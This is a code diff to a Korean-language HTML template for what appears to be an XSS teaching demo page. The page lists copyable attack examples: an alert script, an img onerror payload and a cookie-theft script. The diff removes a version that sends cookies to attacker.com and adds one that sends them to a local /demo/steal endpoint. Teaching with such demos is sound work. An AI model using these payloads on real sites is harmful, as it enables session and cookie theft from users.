@@ -35,7 +35,8 @@
                     <strong>공격 예시:</strong>
                     <ul>
                         <li>경고창: <code>&lt;script&gt;alert('XSS!')&lt;/script&gt;</code><button class="btn-copy" onclick="copyCode(this)">복사</button></li>
-                        <li>쿠키 탈취: <code>&lt;script&gt;fetch('http://attacker.com?c='+document.cookie)&lt;/script&gt;</code><button class="btn-copy" onclick="copyCode(this)">복사</button></li>
+                        <li>쿠키 탈취: <code>&lt;script&gt;fetch('/demo/steal?c='+document.cookie)&lt;/script&gt;</code><button class="btn-copy" onclick="copyCode(this)">복사</button></li>
+                        <li>탈취 결과 확인: <a th:href="@{/demo/steal}" target="_blank">/demo/steal</a></li>
                         <li>이미지 태그: <code>&lt;img src=x onerror="alert('XSS')"&gt;</code><button class="btn-copy" onclick="copyCode(this)">복사</button></li>
                     </ul>
                 </div>
